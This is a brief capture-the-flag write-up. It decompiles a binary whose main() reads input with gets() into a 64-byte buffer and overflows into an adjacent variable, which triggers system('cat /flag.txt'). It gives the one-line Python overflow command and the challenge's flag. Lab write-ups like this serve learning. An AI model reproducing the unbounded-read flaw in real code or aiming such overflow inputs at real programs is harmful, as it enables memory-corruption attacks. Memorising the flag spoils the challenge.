# executable

## Description
No code this time! hahahaha

## Writeup
Put the binary in a decompiler and see the function. This is the output given by Hex-Rays decompiler in dogbolt.
```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[64]; // [esp+Ch] [ebp-4Ch] BYREF
  int v5; // [esp+4Ch] [ebp-Ch]

  setbuf(_bss_start, 0);
  v5 = 0;
  puts("Would you like a flag?");
  gets(s);
  if ( v5 )
    system("cat /flag.txt");
  return 0;
}
```
Clearly, we just have to overwrite the variable v5 and as gets is used, an output larger than 64 bytes will overwrite it (Can be confirmed using gdb as well).
`python -c "print('A'*65)" | ./executable`

## FLAG
COPS{r3v_w17h_pwn}
